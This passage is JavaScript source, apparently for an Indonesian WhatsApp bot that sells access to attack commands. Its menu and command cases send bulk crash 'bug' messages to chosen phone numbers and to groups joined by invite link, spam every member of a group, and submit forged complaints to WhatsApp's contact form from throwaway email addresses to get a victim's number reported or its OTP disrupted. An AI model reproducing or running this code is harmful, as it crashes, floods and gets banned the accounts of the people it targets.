*_Hi @${sender.split('@')[0]}, I Am ${global.BotName} Made By Lexxy Official_*
*_If There Is An Error_*
*_Please Report To Developer_*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬

「 *BOT INFO* 」
 - Creator : ${global.OwnerName}
 - Owner : @${owner.split('@')[0]}
 - Botname : ${global.BotName}
 - Library : *Baileys-MD*
 - Version : @9.0.5
 - Session : *MultiAuthState*

「 *DATABASE* 」
 - Owner : ${ownerC.length}
 - Akses : ${murbugC.length}
 - Total Cmd : ${db_cmd.length}
 - Total Hit : ${db_hit.length}

「 *LIST MENU* 」
 ꔷ ${prefix}bugmenu
 ꔷ ${prefix}mainmenu
 ꔷ ${prefix}pushmenu
 ꔷ ${prefix}unbanmenu
 ꔷ ${prefix}groupmenu
 ꔷ ${prefix}ownermenu

 *RUNTIME*
 ${runtime(process.uptime())}

 *Powered By @${mark.split('@')[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
mentions(teks,[mark,owner,sender,creator])
}
addCmd(command, 1, db_cmd)
break
case "buysc":{
reply(`*sc ini 70k aja, minat chat*\nwa.me/6282279915237`)
}
addCmd(command, 1, db_cmd)
break
case "jasaunban":{
reply(`*jasa unban wa 50k++, minat chat*\nwa.me/6282279915237`)
}
addCmd(command, 1, db_cmd)
break
case "buypanel":{
reply(`*List Harga Panel Lexxy*

Ram 1GB Cpu 30%
Rp5.000/Bulan

Ram 2GB Cpu 60%
Rp10.000/Bulan

Ram 3GB Cpu 90%
Rp15.000/Bulan

Ram 4GB Cpu 120%
Rp20.000/Bulan

Ram 5GB Cpu 150%
Rp25.000/Bulan

Ram 6GB Cpu 180%
Rp30.000/Bulan

Group Panel:
https://chat.whatsapp.com/KC77f3OfEuKEJHzSKAJNdD`)
}
addCmd(command, 1, db_cmd)
break

// AKSES MENU
case 'owner':{
var angkaC = 1
for (let i of myowner) {
sendContact(from, i, `OWNER [${angkaC++}]`)
await sleep(2000)
}
sendContact(from, global.OwnerNumber, "DEV "+global.OwnerName+" 👑")
await sleep(2000)
reply(global.mess.PesanBotKirimKontak)
}
addCmd(command, 1, db_cmd)
break
case 'autoread':{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
autoread = true
reply(global.mess.AutoReadAktif)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
autoread = false
reply(global.mess.AutoReadMati)
} else { reply('Kata kunci tidak ditemukan!') }
}
addCmd(command, 1, db_cmd)
break
case 'mengetik':{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
mengetik = true
reply('*BOT MENGETIK : AKTIF*')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
mengetik = false
reply('*BOT MENGETIK : TIDAK AKTIF*')
} else { reply('Kata kunci tidak ditemukan!') }
}
addCmd(command, 1, db_cmd)
break
case 'mode':{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : public & self\nContoh : #${command} public`)
if (args[0] == "public") {
public = true
reply('*BOT MODE : PUBLIC*')
} else if (args[0] == "self") {
public = false
reply('*BOT MODE : SELF*')
} else { reply(`Kirim perintah #${command} _options_\nOptions : public & self\nContoh : #${command} public`) }
}
addCmd(command, 1, db_cmd)
break
case "resetdb":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
reply('*Sedang Menghapus...*\n*Cmd Dan Hit Bot*')
db_cmd.splice("[]")
fs.writeFileSync("./connect/database/allcmd.json", JSON.stringify(db_cmd, null, 1))
await sleep(2000)
db_hit.splice("[]")
fs.writeFileSync("./connect/database/reqhit.json", JSON.stringify(db_hit, null, 1))
reply(`*SUKSES RESET DATABASE*`)
}
break
case 'dashboard': case 'db':{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var jumlahCmd = db_cmd.length
var teks = `*DASHBOARD*\n*Total Cmd : ${jumlahCmd}*\n*Total Hit : ${db_hit.length}*\n\n*COMMAND*`
for (var i of db_cmd) {
teks +=`\n${i.id} = ${i.total}`
}
reply(teks)
}
addCmd(command, 1, db_cmd)
break
case "database":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var Owner_ = JSON.parse(fs.readFileSync('./connect/database/owner.json'))
var Murbug_ = JSON.parse(fs.readFileSync('./connect/database/murbug.json'))
var take1 = `*LIST DATABASE BOT*\n\n*Jumlah Owner : ${Owner_.length}*\n*Jumlah Akses : ${Murbug_.length}*\n\n*LIST AKSES*\n`
var take2 = `*LIST OWNER*\n`
var yy1 = 1
var yy2 = 1
for (var i of Murbug_){
take1 +=`*Users :* ${yy1++}\n*Number :* ${i}\n\n`
}
for (var i of Owner_){
take2 +=`*Users :* ${yy2++}\n*Number :* ${i}\n\n`
}
take1 +=`*Example :*\n• .delete 628xxxx buat hapus akses\n\n`
take2 +=`*Example :*\n• .delown 628xxxx buat hapus owner`
reply(take1+take2)
}
addCmd(command, 1, db_cmd)
break
case "block":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var ya = q.replace(/[^0-9]/g, '')
if (!ya) return reply(`*Penggunaan:*\n${prefix+command} nomor\n\n*Contoh:*\n${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
var yaww = ya+`@s.whatsapp.net`
await conn.updateBlockStatus(yaww, "block").then(res => {
mentions(`*NUMBER @${yaww.split('@')[0]} BERHASIL DI BLOCK*`, [yaww])
}).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case "unblock":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var ya = q.replace(/[^0-9]/g, '')
if (!ya) return reply(`*Penggunaan:*\n${prefix+command} nomor\n\n*Contoh:*\n${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
var yaww = ya+`@s.whatsapp.net`
await conn.updateBlockStatus(yaww, "unblock").then(res => {
mentions(`*NUMBER @${yaww.split('@')[0]} BERHASIL DI UNBLOCK*`, [yaww])
}).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case "delowner":
case "delown":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var ya = q.replace(/[^0-9]/g, '')
if (!ya) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
var unp = myowner.indexOf(ya)
myowner.splice(unp, 1)
fs.writeFileSync("./connect/database/owner.json", JSON.stringify(myowner))
var delusr = ya+"@s.whatsapp.net"
mentions(`*SUKSES DELETE OWNER* @${delusr.split('@')[0]}`, [delusr])
}
addCmd(command, 1, db_cmd)
break
case "resetowner":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
myowner.splice("[]")
fs.writeFileSync("./connect/database/owner.json", JSON.stringify(myowner, null, 1))
reply(`*SUKSES RESET DATABASE OWNER*`)
}
addCmd(command, 1, db_cmd)
break
case "addowner":
case "addown":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var yo = q.replace(/[^0-9]/g, '')
if (!yo) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
myowner.push(yo)
fs.writeFileSync("./connect/database/owner.json", JSON.stringify(myowner))
var addusr = yo+"@s.whatsapp.net"
mentions(`*SUKSES ADD OWNER* @${addusr.split('@')[0]}`, [addusr])
}
addCmd(command, 1, db_cmd)
break
case "delete":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var ya = q.replace(/[^0-9]/g, '')
if (!ya) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
var unp = murbug.indexOf(ya)
murbug.splice(unp, 1)
fs.writeFileSync("./connect/database/murbug.json", JSON.stringify(murbug))
var delusr = ya+"@s.whatsapp.net"
mentions(`*SUKSES DELETE AKSES* @${delusr.split('@')[0]}`, [delusr])
conn.sendMessage(delusr, {text: `*HALLO @${delusr.split('@')[0]} SEKARANG ANDA TIDAK BISA AKSES FITUR BUG LAGI, DIKARENAKAN ANDA SUDAH DI DELETE OLEH OWNER*`, mentions: [delusr]})
}
addCmd(command, 1, db_cmd)
break
case "akses":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
var yo = q.replace(/[^0-9]/g, '')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
murbug.push(yo)
fs.writeFileSync("./connect/database/murbug.json", JSON.stringify(murbug))
var addusr = yo+"@s.whatsapp.net"
mentions(`*SUKSES ADD AKSES* @${addusr.split('@')[0]}`, [addusr])
conn.sendMessage(addusr, {text: `*HALLO @${addusr.split('@')[0]} ANDA SUDAH BISA AKSES FITUR BUG*`, mentions: [addusr]})
}
addCmd(command, 1, db_cmd)
break
case "resetakses":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
murbug.splice("[]")
fs.writeFileSync("./connect/database/murbug.json", JSON.stringify(murbug, null, 1))
reply(`*SUKSES RESET DATABASE AKSES*`)
}
addCmd(command, 1, db_cmd)
break
case "runtime":
case "tes":
case "test":{
reply(`*BOT ONLINE : ${runtime(process.uptime())}*`)
}
addCmd(command, 1, db_cmd)
break
case "allgas":
case "bugpc":
case "gasken":
case "lexgass":
case "lexgbug":
case "crashpc":
case "sendbug":
case "document":
case "santetpc":
case "gaslexx":
case "buglexx":
case "catalexx":
case "epeplexx":
case "attacklexx":
case "lexxsend":
case "sendlexx":{
if (!isDeveloper && !isAkses && !isOwner) return reply(global.mess.AksesOnly)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1]
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (!jumlah) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let jumlahnya = `${encodeURI(jumlah)}`
if (jumlahnya > global.Max_Bug_Attack) return reply(`max send number of bugs ${global.Max_Bug_Attack} if above it will fail`)
var cekap = await conn.onWhatsApp(targetnya + '@s.whatsapp.net')
let target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(global.mess.NotNumber)
if (target == '6285789004732@s.whatsapp.net') return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == '6285789004732@s.whatsapp.net') return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == `${CreatorLexxy}@s.whatsapp.net`) return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == `${global.OwnerNumber}@s.whatsapp.net`) return reply(`*gagal mengirim bug ke owner bot, sekian terima kasih.*`)
reply(global.mess.PesanBugDikirim)
var waktu_Delay_Bug = global.WaktuDelayBug
await sleep(waktu_Delay_Bug)
sendBugChat(target,jumlahnya)
sendBugSpam(target,jumlahnya)
sendBugNew(target,5)
sendBugButtonV1(target,5)
sendBugButtonV2(target,5)
await sleep(waktu_Delay_Bug)
mentions(`*${command.toUpperCase()} BERHASIL TERKIRIM*\n*TARGET :* @${target.split('@')[0]}\n*JUMLAH SPAM :* ${jumlahnya}×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*GAK JEDA DELETE AKSES*`, [target])
}
addCmd(command, 1, db_cmd)
break
case "buggc":
case "santetgc":
case "bomgc":
case "crashgc":
case "attackgc":
case "buglexgc":
case "crashgc":
case "gaskengc":
case "bugingc":
case "ampasgc":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 5|linkgrup`)
var jumlah = q.split('|')[0]
var target = q.split('|')[1]
var jumlahnya = `${encodeURI(jumlah)}`
if (jumlahnya > global.Max_Bug_Attack) return reply(`max send group of bugs ${global.Max_Bug_Attack} if above it will fail`)
if (!isUrl(target) && !target.includes('whatsapp.com')) return reply('Link Invalid!')
var result = target.split('https://chat.whatsapp.com/')[1]
reply('*Proses 1 Menit*')
await conn.groupAcceptInvite(result).then(res =>{
sendBugGroup(res,jumlahnya)
reply("*DONE BUG TERKIRIM ✓*\n*HARAP JEDA 5 MENIT*")
}).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case "hogbcuy":
case "yogbcuy":
case "yagbcuy":
case "bogbcuy":
case "wagbcuy":
case "gasgbcuy":
case "lexgbcuy":
case "sengbcuy":
case "epgbcuy":
case "gogbcuy":{
if (!isDeveloper && !isAkses && !isOwner) return reply(global.mess.AksesOnly)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number\n\n*Contoh:*\n${prefix+command} 628xxxx`)
var targetnya = q.replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(targetnya + '@s.whatsapp.net')
var target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(global.mess.NotNumber)
if (target == '6285789004732@s.whatsapp.net') return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == '6285789004732@s.whatsapp.net') return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == `${CreatorLexxy}@s.whatsapp.net`) return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == `${global.OwnerNumber}@s.whatsapp.net`) return reply(`*gagal mengirim bug ke owner bot, sekian terima kasih.*`)
reply(global.mess.PesanBugDikirim)
var waktu_Delay_Bug = global.WaktuDelayBug
await sleep(waktu_Delay_Bug)
sendBugButtonV1(target,10)
sendBugButtonV2(target,10)
await sleep(waktu_Delay_Bug)
mentions(`*${command.toUpperCase()} BERHASIL TERKIRIM*\n*TARGET :* @${target.split('@')[0]}\n*JUMLAH SPAM :* 10×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*GAK JEDA DELETE AKSES*`, [target])
}
addCmd(command, 1, db_cmd)
break
case "😈":
case "☠️":
case "👻":
case "💥":
case "🔥":
case "🌹":
case "🌷":
case "🦕":
case "🦖":
case "🦎":{
if (!isDeveloper && !isAkses && !isOwner) return reply(global.mess.AksesOnly)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${command} number,jumlah\n\n*Contoh:*\n${command} 628xxxx,5`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1]
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (!jumlah) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let jumlahnya = `${encodeURI(jumlah)}`
if (jumlahnya > global.Max_Bug_Emoji) return reply(`max send number of bugs ${global.Max_Bug_Emoji} if above it will fail`)
var cekap = await conn.onWhatsApp(targetnya + '@s.whatsapp.net')
let target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(global.mess.NotNumber)
if (target == '6285789004732@s.whatsapp.net') return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == '6285789004732@s.whatsapp.net') return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == `${CreatorLexxy}@s.whatsapp.net`) return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == `${global.OwnerNumber}@s.whatsapp.net`) return reply(`*gagal mengirim bug ke owner bot, sekian terima kasih.*`)
reply(global.mess.PesanBugDikirim)
var waktu_Delay_Bug = global.WaktuDelayBug
await sleep(waktu_Delay_Bug)
sendBugChat(target,jumlahnya)
await sleep(waktu_Delay_Bug)
mentions(`*${command.toUpperCase()} BERHASIL TERKIRIM*\n*TARGET :* @${target.split('@')[0]}\n*JUMLAH SPAM :* ${jumlahnya}×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*GAK JEDA DELETE AKSES*`, [target])
}
addCmd(command, 1, db_cmd)
break
case "bugteks":
case "bugspam":
case "bugepep":{
if (!isDeveloper && !isAkses && !isOwner) return reply(global.mess.AksesOnly)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${command} number,jumlah\n\n*Contoh:*\n${command} 628xxxx,5`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1]
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (!jumlah) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let jumlahnya = `${encodeURI(jumlah)}`
if (jumlahnya > global.Max_Bug_Emoji) return reply(`max send number of bugs ${global.Max_Bug_Emoji} if above it will fail`)
var cekap = await conn.onWhatsApp(targetnya + '@s.whatsapp.net')
let target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(global.mess.NotNumber)
if (target == '6285789004732@s.whatsapp.net') return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == '6285789004732@s.whatsapp.net') return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == `${CreatorLexxy}@s.whatsapp.net`) return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
if (target == `${global.OwnerNumber}@s.whatsapp.net`) return reply(`*gagal mengirim bug ke owner bot, sekian terima kasih.*`)
reply(global.mess.PesanBugDikirim)
await sleep(1000)
sendBugSpam(target,jumlahnya)
await sleep(3000)
mentions(`*${command.toUpperCase()} BERHASIL TERKIRIM*\n*TARGET :* @${target.split('@')[0]}\n*JUMLAH SPAM :* ${jumlahnya}×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*GAK JEDA DELETE AKSES*`, [target])
}
addCmd(command, 1, db_cmd)
break
case "join":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} linkgrup`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case "listgroup":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await conn.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
addCmd(command, 1, db_cmd)
break
case "pushv1":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Format Salah Silahkan Gunakan Contoh Sebagai Berikut\n${prefix+command} idgroup|teks\nUntuk Melihat ID Group Silahkan Ketik .listgroup`)
const metadata2 = await conn.groupMetadata(q.split("|")[0]).catch((err) => reply(err))
reply(`Please wait a moment..`)
const halss = metadata2.participants
for (let mem of halss) {
conn.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] }).catch((err) => reply(err))
await sleep(1000)
}}
addCmd(command, 1, db_cmd)
break
case "pushv2":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!isGroup) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
if (!q) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
const metadata3 = await conn.groupMetadata(from).catch((err) => reply(err))
reply(`Please wait a moment..`)
const halsss = metadata3.participants
for (let men of halsss) {
conn.sendMessage(`${men.id.split('@')[0]}` + "@s.whatsapp.net", { text: q }).catch((err) => reply(err))
await sleep(1000)
}}
addCmd(command, 1, db_cmd)
break

case "komplain":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`_*Example*_\n${prefix+command} number|teks|email\n\n_*Contoh*_\n${prefix+command} 628xxxx|teks|lexx@gmail.com`)
let jircoyyyy = q.split('|')[0]
let teksssss = q.split('|')[1]
let emailnya = q.split('|')[2]
if (!jircoyyyy) return reply(`_*Example*_\n${prefix+command} number|teks|email\n\n_*Contoh*_\n${prefix+command} 628xxxx|teks|lexxyofficial@gmail.com`)
if (!teksssss) return reply(`_*Example*_\n${prefix+command} number|teks|email\n\n_*Contoh*_\n${prefix+command} 628xxxx|teks|lexxyofficial@gmail.com`)
if (!emailnya) return reply(`_*Example*_\n${prefix+command} number|teks|email\n\n_*Contoh*_\n${prefix+command} 628xxxx|teks|lexxyofficial@gmail.com`)
let dia = jircoyyyy.split("|")[0].replace(/[^0-9]/g, '')
if (dia == CreatorLexxy) return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
//let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", emailnya)
form.append("email_confirm", emailnya)
form.append("platform", "ANDROID")
form.append("your_message", `${teksssss}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break

case "resetotp":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
if (dia == CreatorLexxy) return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Por favor, pesquise o código OTP para este número porque outra pessoa acidentalmente se conectou com meu número e eu tive que esperar 14 horas, por favor, pesquise novamente neste número`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break

// UNBANNED MENU
case "unbanv1":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban1()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv2":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban2()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv3":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
